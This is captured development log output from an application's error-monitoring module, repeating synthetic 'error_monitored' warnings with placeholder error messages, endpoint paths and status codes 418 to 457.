WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706413Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 418'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706466Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 419'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 420'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706575Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 421'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706626Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 422'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706676Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 423'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706772Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 424'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706842Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 425'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706900Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 426'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.706972Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 427'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707061Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 428'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707122Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 429'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707175Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 430'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707226Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 431'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707276Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 432'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707326Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 433'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707377Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 434'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707428Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 435'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707477Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 436'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707526Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 437'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707576Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 438'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707626Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 439'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707675Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 440'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707724Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 441'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707772Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 442'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707822Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 443'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707870Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 444'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707919Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 445'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.707967Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 446'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708015Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 447'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708063Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 448'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708110Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m9[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 449'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708160Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 450'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708208Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 451'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708256Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 452'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708307Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 453'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708358Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 454'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708408Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 455'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708457Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 456'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708506Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 457'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
